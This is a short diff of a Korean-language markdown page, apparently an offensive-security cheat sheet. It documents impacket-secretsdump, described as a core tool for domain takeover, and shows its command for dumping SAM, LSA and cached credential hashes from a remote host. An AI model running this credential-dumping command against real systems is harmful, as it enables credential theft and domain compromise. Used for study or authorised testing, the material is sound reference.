@@ -11,6 +11,7 @@ sitemap: false
 
 - **목적:** 원격 시스템의 SAM, LSA Secrets, NTDS.dit 등에서 모든 종류의 크리덴셜을 덤프합니다.
 - **특징:** 도메인 장악의 핵심 도구입니다.
+
 ```bash
 # 원격 시스템의 모든 해시 덤프 (SAM, LSA, cached)
 impacket-secretsdump <domain>/<user>:<password>@$target
